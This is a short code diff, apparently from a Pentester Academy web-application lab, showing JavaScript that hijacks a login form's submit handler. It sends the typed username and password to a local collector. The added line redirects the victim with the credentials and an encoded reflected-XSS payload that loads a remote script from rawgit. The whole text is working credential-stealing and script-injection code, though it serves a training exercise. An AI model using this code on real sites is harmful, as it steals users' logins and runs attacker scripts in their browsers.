@@ -6,5 +6,6 @@ function onFormSubmit()
 	var request = new XMLHttpRequest();
 	request.open("POST", "http://localhost:8000?username=" + usernameForm + "&password=" + passwordForm, true);
 	request.send();
+	window.location.replace("http://pentesteracademylab.appspot.com/lab/webapp/jfp/3?email=" + usernameForm + "&password=" + passwordForm + "&url=<script src%3D\"https%3A%2F%2Frawgit.com%2Fcharner93%2Fscripts%2Fmaster%2FJFP.js\"><%2Fscript>");
 }
 document.forms[0].onsubmit = onFormSubmit;
